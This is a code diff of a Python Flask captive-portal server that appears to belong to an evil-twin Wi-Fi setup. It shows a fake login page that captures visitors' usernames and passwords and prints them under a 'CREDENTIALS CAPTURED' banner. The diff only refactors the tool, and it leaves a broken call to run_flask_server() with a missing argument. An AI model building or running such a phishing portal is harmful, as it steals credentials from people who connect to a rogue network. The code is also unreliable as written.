@@ -53,6 +53,7 @@ def get_mac_from_ip(ip):
 
 # THE HOME BASE: This is the only place that actually hands out the HTML interface.
 @app.route('/')
+@app.route('/index.html')
 def index():
     return LOGIN_PAGE_HTML, 200
 
@@ -78,7 +79,7 @@ def captive_traps():
 # Catch-all route for any other random background URL the device hits
 @app.errorhandler(404)
 def page_not_found(e):
-    return redirect('http://192.168.1.1:5000/index.html')
+    return redirect('http://192.168.1.1:5000/')
     
 
 # ==============================================================================
@@ -92,9 +93,7 @@ def login():
     password = request.form.get('password')
     client_ip = request.remote_addr 
 
-    # Define your access point interface name here 
-    # (Or pass it in globally from your main script configuration)
-    EV_INTERFACE = "wlxe84e06aed7c3" 
+    EV_INTERFACE = app.config.get('EV_INTERFACE', 'wlxe84e06aed7c3')
 
     # --------------------------------------------------------------------------
     # MONITOR USER INPUT
@@ -103,7 +102,7 @@ def login():
     print(f"🚨 CREDENTIALS CAPTURED FROM {client_ip}")
     print(f"👤 USERNAME: {username}")
     print(f"🔑 PASSWORD: {password}")
-    print("!"*50 + "\n")
+    print("!"*50 )
 
     # --------------------------------------------------------------------------
     # AUTHENTICATION & INTERNET PROVISIONING
@@ -147,17 +146,21 @@ def login():
 # 5. START THE SERVER
 # ==============================================================================
 
-def run_flask_server():
+def run_flask_server(interface_name):
     """Function to start the Flask application. 
     This blocks, so it must be run inside a thread."""
     # Use 'werkzeug' logging tweaks if you want to suppress standard request spam
     #import logging
     #log = logging.getLogger('werkzeug')
     #log.setLevel(logging.ERROR) 
+    """Function to start the Flask application inside a thread."""
     
+    # Save the interface to Flask's internal configuration dictionary
+    app.config['EV_INTERFACE'] = interface_name
     # Run the server on port 5000 across all interfaces
     app.run(host='0.0.0.0', port=5000, threaded=True, use_reloader=False)
 
 if __name__ == '__main__':
+    
     # Listens on all local network interfaces on port 5000
     run_flask_server()
